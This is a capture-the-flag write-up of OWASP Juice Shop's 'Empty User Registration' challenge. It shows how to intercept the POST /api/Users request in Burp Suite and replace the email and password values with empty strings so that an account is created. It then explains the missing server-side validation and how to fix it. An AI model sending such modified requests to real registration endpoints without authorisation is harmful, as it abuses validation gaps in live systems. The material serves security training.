# Empty User Registration Challenge

| Item | Detail |
|---|---|
| Category | Improper Input Validation |
| Difficulty | Medium (2-Star) |
| Juice Shop Flag | `score-board#Empty User Registration` |
| Tools Used | Burp Suite (Proxy / Repeater) |
| Status | Solved |

---

## 1. Vulnerability Explanation

The registration form requires an email address and password, but the backend does not properly validate whether these fields contain actual values.

By intercepting the registration request, an attacker can submit empty strings:

```json
""
```

for both email and password.

The server accepts this as a valid registration because of missing server-side input validation.

---

## 2. Security Impact

- Creation of invalid or dummy user accounts  
- Database pollution with meaningless entries  
- Potential abuse in rate-limiting or brute-force scenarios  
- Demonstrates missing backend validation  

---

## 3. Step-by-Step Exploitation

### Step 1: Setup

- Configure browser to route traffic through Burp Suite (`127.0.0.1:8080`)  
- Navigate to the registration page:

```text
/#/register
```

### Step 2: Intercept the registration request

- Turn **Intercept ON** in Burp Proxy tab  
- Fill the registration form with any values  

Example:

```text
test@test.com / password123
```

- Click **Register**  
- Burp captures the `POST /api/Users` request  

Original request:

```http
POST /api/Users HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{"email":"test@test.com","password":"password123","passwordRepeat":"password123"}
```

### Step 3: Modify the request in Repeater

Send the request to **Repeater** (`Ctrl + R`) and replace the payload with:

```json
{"email":"","password":"","passwordRepeat":""}
```

### Step 4: Send the request

- Click **Send** in Repeater  

Successful response:

```json
{"status":"success","data":{"id":42,"email":"","password":"..."}}
```

### Step 5: Verify

- Check the **Score Board**  
- Challenge is marked as **Solved**

---

## 4. Why This Works

The registration endpoint likely checks only whether the required fields exist in the request, but not whether they contain meaningful values.

An empty string is still a valid JSON value.

The field:

```text
passwordRepeat
```

also matches the empty password, so validation passes.

---

## 5. Mitigation

- Validate that email is not empty and follows proper email format  
- Enforce minimum password length and complexity requirements  
- Never rely only on client-side validation  

---

## 6. Key Takeaways

- Always validate user input on the server side  
- Empty strings are valid JSON values but should not be accepted as credentials  
- Burp Repeater is useful for testing boundary conditions  
- 2-star challenges often involve logic flaws and edge cases  